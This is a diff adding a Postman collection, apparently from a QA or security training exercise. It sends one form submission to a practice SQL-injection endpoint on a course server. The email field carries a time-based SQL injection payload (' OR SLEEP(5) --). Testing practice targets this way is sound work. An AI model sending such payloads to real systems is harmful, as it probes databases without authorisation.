@@ -1,0 +1,59 @@
+{
+	"info": {
+		"_postman_id": "3fe831d6-6f3d-4afe-96de-2e029c611dd9",
+		"name": "25.7 WorkHack",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
+		"_exporter_id": "40799991"
+	},
+	"item": [
+		{
+			"name": "Критическая задержка при отправке сообщения",
+			"request": {
+				"auth": {
+					"type": "noauth"
+				},
+				"method": "POST",
+				"header": [],
+				"body": {
+					"mode": "urlencoded",
+					"urlencoded": [
+						{
+							"key": "name",
+							"value": "tester",
+							"type": "text"
+						},
+						{
+							"key": "email",
+							"value": "tester@test.com' OR SLEEP(5) --  ",
+							"type": "text"
+						},
+						{
+							"key": "heading",
+							"value": "test",
+							"type": "text"
+						},
+						{
+							"key": "text",
+							"value": "test",
+							"type": "text"
+						}
+					]
+				},
+				"url": {
+					"raw": "http://api-qa.skillbox.ru/practicesqli/validate.php",
+					"protocol": "http",
+					"host": [
+						"api-qa",
+						"skillbox",
+						"ru"
+					],
+					"path": [
+						"practicesqli",
+						"validate.php"
+					]
+				}
+			},
+			"response": []
+		}
+	]
+}
